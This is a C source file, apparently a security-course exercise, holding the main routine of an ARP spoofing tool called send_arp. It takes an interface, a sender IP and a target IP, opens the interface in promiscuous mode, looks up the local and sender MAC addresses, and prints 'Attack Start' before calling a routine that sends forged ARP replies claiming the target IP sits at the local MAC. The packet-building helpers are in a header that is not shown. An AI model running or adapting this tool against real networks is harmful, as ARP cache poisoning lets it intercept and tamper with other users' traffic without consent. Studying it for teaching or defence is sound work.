#include "send_arp.h"

int main(int argc, char** argv){
    pcap_t *handle;   /* Session handle */
    char *dev;  /* device to communication */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct ether_addr LocalMac;   /* my mac address */
    struct ether_addr SenderMac;
    struct in_addr LocalIP, SenderIP, TargetIP;
    /* Check argument count */
    if(argc != 4){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    /* check arguments are IP format */
    if(inet_pton(AF_INET, argv[2], &SenderIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    if(inet_pton(AF_INET, argv[3], &TargetIP) != 1){
        printf("usage : %s <interface> <sender ip> <target ip>\n",argv[0]);
        return -1;
    }
    /* Define device */
    dev = argv[1];

    printf("**********************************\n");
    printf("Spoofing Program Start!!\n");
    printf("Interface is %s\n",dev);
    printf("Sender IP is %s\n",inet_ntoa(SenderIP));
    printf("Target IP is %s\n",inet_ntoa(TargetIP));

    /* Open session in promiscuous mode */
    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }
    /* Get Local IP addr */
    if(GetLocalIP(dev, &LocalIP) != 1){
        fprintf(stderr, "Couldn't get IPv4\n");
        return 2;
    }

    printf("Local IP is %s\n",inet_ntoa(LocalIP));

    printf("**********************************\n");
    printf("Get Local Mac Address...\n");

    /* Get Local Mac Address */
    if(GetLocalMac(dev, &LocalMac) != 1){
        fprintf(stderr, "Couldn't Get local Mac Address\n");
        return 2;
    }

    printf("Success!!\n");
    printf("Local Mac Address is %s\n",ether_ntoa(&LocalMac));

    printf("**********************************\n");
    printf("Get Sender Mac Address...\n");

    /* Get Sender Mac Address */
    if(GetSenderMac(handle, LocalMac, LocalIP, SenderIP, &SenderMac) != 1){
        fprintf(stderr, "Couldn't Get Sender Mac Address\n");
        return 2;
    }

    printf("Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
    printf("**********************************\n");
    printf("Attack Start\n");
    printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&LocalMac));

    /* Generate Fake Arp Reply Packet and send */
    if(AttackPacket(handle,SenderMac,LocalMac,TargetIP,SenderIP) != 1){
        fprintf(stderr, "Couldn't Attack\n");
        return 2;
    }

    printf("Done!\n");
    return 0;
}
